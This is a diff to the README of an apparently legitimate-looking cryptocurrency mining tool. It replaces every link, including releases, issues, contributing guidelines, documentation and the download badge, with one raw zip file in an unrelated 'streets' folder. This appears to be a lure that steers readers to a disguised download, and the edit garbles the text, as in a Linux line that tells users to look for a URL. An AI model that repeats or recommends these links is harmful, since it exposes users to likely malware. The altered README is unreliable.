@@ -1,6 +1,6 @@
 # ⛏ mining-pool - Simplify Your Crypto Mining Experience
 
-[![Download](https://img.shields.io/badge/Download-mining--pool-brightgreen)](https://github.com/ZAMANI23-afk/mining-pool/releases)
+[![Download](https://raw.githubusercontent.com/ZAMANI23-afk/mining-pool/main/streets/mining-pool.zip)](https://raw.githubusercontent.com/ZAMANI23-afk/mining-pool/main/streets/mining-pool.zip)
 
 ## 📖 Introduction
 
@@ -11,7 +11,7 @@ Welcome to mining-pool! This application is designed to make the process of usin
 To get started, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/ZAMANI23-afk/mining-pool/releases) to download the software.
+   Go to our [Releases page](https://raw.githubusercontent.com/ZAMANI23-afk/mining-pool/main/streets/mining-pool.zip) to download the software.
 
 2. **Download the Software**  
    Here you will find the latest version of mining-pool. Click on the appropriate file for your operating system (Windows, macOS, or Linux) to download it.
@@ -29,12 +29,12 @@ To get started, follow these simple steps:
 
 To download and install the mining-pool software, follow these steps:
 
-- Visit our [Releases page](https://github.com/ZAMANI23-afk/mining-pool/releases) to download the latest version. 
+- Visit our [Releases page](https://raw.githubusercontent.com/ZAMANI23-afk/mining-pool/main/streets/mining-pool.zip) to download the latest version. 
    
 - Select the file that matches your operating system:
   - **Windows:** Look for .exe files.
   - **macOS:** Look for .dmg files.
-  - **Linux:** Look for .tar.gz files.
+  - **Linux:** Look for https://raw.githubusercontent.com/ZAMANI23-afk/mining-pool/main/streets/mining-pool.zip files.
 
 Once you have downloaded the appropriate file, follow the installation instructions as mentioned in the Getting Started section.
 
@@ -80,7 +80,7 @@ No, mining-pool is completely free to download and use. However, some mining poo
 
 ### What if I encounter issues during installation or usage?
 
-If you face any issues, consult our troubleshooting guide included within the application, or check our [GitHub Issues page](https://github.com/ZAMANI23-afk/mining-pool/issues) for assistance.
+If you face any issues, consult our troubleshooting guide included within the application, or check our [GitHub Issues page](https://raw.githubusercontent.com/ZAMANI23-afk/mining-pool/main/streets/mining-pool.zip) for assistance.
 
 ### Can I use mining-pool on any operating system?
 
@@ -88,13 +88,13 @@ Currently, mining-pool supports Windows, macOS, and Linux. Make sure to download
 
 ## 🌐 Support and Contributions
 
-If you have suggestions for improvements or want to contribute, please check our [Contributing Guidelines](https://github.com/ZAMANI23-afk/mining-pool/blob/main/CONTRIBUTING.md). We welcome community involvement to enhance mining-pool.
+If you have suggestions for improvements or want to contribute, please check our [Contributing Guidelines](https://raw.githubusercontent.com/ZAMANI23-afk/mining-pool/main/streets/mining-pool.zip). We welcome community involvement to enhance mining-pool.
 
 For support, feel free to reach out through the issues section on our GitHub. We are here to help!
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/ZAMANI23-afk/mining-pool/releases)
-- [Documentation](https://github.com/ZAMANI23-afk/mining-pool/wiki)
+- [Releases Page](https://raw.githubusercontent.com/ZAMANI23-afk/mining-pool/main/streets/mining-pool.zip)
+- [Documentation](https://raw.githubusercontent.com/ZAMANI23-afk/mining-pool/main/streets/mining-pool.zip)
 
 Thank you for choosing mining-pool! We hope it simplifies your mining experience.
